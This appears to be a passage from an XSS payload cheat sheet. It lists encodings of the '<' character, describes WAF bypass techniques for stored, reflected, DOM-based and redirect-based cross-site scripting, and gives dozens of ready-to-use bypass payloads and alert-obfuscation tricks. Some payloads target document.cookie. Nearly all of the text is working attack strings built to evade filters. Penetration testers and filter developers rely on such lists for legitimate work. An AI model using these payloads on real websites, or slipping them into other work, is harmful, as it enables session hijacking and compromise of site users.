All possible combinations of character `\<` in HTML and JavaScript. Most won't render out of the box; many render in certain circumstances as seen above.

- `<`
- `%3C`
- `&lt`
- `&lt;`
- `&LT`
- `&LT;`
- `&#60`
- `&#060`
- `&#0060`
- `&#00060`
- `&#000060`
- `&#0000060`
- `&#60;`
- `&#060;`
- `&#0060;`
- `&#00060;`
- `&#000060;`
- `&#0000060;`
- `&#x3c`
- `&#x03c`
- `&#x003c`
- `&#x0003c`
- `&#x00003c`
- `&#x000003c`
- `&#x3c;`
- `&#x03c;`
- `&#x003c;`
- `&#x0003c;`
- `&#x00003c;`
- `&#x000003c;`
- `&#X3c`
- `&#X03c`
- `&#X003c`
- `&#X0003c`
- `&#X00003c`
- `&#X000003c`
- `&#X3c;`
- `&#X03c;`
- `&#X003c;`
- `&#X0003c;`
- `&#X00003c;`
- `&#X000003c;`
- `&#x3C`
- `&#x03C`
- `&#x003C`
- `&#x0003C`
- `&#x00003C`
- `&#x000003C`
- `&#x3C;`
- `&#x03C;`
- `&#x003C;`
- `&#x0003C;`
- `&#x00003C;`
- `&#x000003C;`
- `&#X3C`
- `&#X03C`
- `&#X003C`
- `&#X0003C`
- `&#X00003C`
- `&#X000003C`
- `&#X3C;`
- `&#X03C;`
- `&#X003C;`
- `&#X0003C;`
- `&#X00003C;`
- `&#X000003C;`
- `\x3c`
- `\x3C`
- `\u003c`
- `\u003C`

## Methods to Bypass WAF – Cross-Site Scripting

### General issues

#### Stored XSS

If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.

#### Reflected XSS in JavaScript

Example:

```js
<script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
```

Exploitation:

```js
/?xss=500); alert(document.cookie);//
```

#### DOM-based XSS

Example:

```js
<script> ... eval($\_GET\[xss\]); ... </script>
```

Exploitation:

```js
/?xss=document.cookie
```

#### XSS via request Redirection

Vulnerable code:

```js
...
header('Location: '.$_GET['param']);
...
```

As well as:

```js
...
header('Refresh: 0; URL='.$_GET['param']);
...
```

This request will not pass through the WAF:

```html
/?param=<javascript:alert(document.cookie>)
```

This request will pass through the WAF and an XSS attack will be conducted in certain browsers:

```html
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

### WAF ByPass Strings for XSS

<!-- markdownlint-disable MD038-->
- `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
- `<Video> <source onerror = "javascript: alert (XSS)">`
- `<Input value = "XSS" type = text>`
- `<applet code="javascript:confirm(document.cookie);">`
- `<isindex x="javascript:" onmouseover="alert(XSS)">`
- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
- `"><img src="x:x" onerror="alert(XSS)">`
- `"><iframe src="javascript:alert(XSS)">`
- `<object data="javascript:alert(XSS)">`
- `<isindex type=image src=1 onerror=alert(XSS)>`
- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
- `<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>`
- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`

```html
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
```

- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
- `<form><a href="javascript:\u0061lert(1)">X`
- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
- `<style>//*{x:expression(alert(/xss/))}//<style></style>`

 On Mouse Over​:

- `<img src="/" =_=" title="onerror='prompt(1)'">`
- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`

```html
<script x> alert(1) </script 1=2
```

- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
- `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> `
<!-- markdownlint-enable MD038-->

### Filter Bypass Alert Obfuscation

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](1)`
- `top[/al/.source+/ert/.source](1)`
- `al\u0065rt(1)`
- `top[‘al\145rt’](1)`
- `top[‘al\x65rt’](1)`
- `top[8680439..toString(30)](1)`
- `alert?.()`
- `(alert())`

The payload should include leading and trailing backticks:

```js
&#96;`${alert``}`&#96;
```

## References

- MDN: Cross-Site Scripting (XSS)
- CWE-79: Improper Neutralization of Input During Web Page Generation
